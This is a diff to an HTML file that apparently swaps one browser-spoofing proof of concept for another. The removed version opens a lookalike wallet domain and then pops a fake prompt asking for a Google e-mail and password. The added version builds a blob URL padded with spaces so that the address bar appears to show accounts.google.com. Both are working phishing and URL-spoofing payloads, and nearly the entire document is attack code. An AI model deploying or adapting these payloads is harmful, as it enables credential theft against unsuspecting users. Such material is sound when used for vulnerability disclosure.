@@ -1,23 +1,4 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <script>
-      function exploit() {
-        // Opens legitimate-looking Google tab
-        window.open("https://سwallet.status.im");
-
-        // Delay 2 detik sebelum menampilkan prompt palsu
-        setTimeout(function () {
-          document.getElementById("iframe").src =
-            'javascript:prompt("In order to access wallet\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-        }, 2000); // 2000 ms = 2 detik
-      }
-    </script>
-
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to wallet</h1></center>
-    </a>
-
-    <iframe id="iframe" style="display:none;" src=""></iframe>
-  </body>
-</html>
+<script>
+var exp = 'FAKE GOOGLE<script>history.replaceState("","","blob:+//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
+location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
+</script>
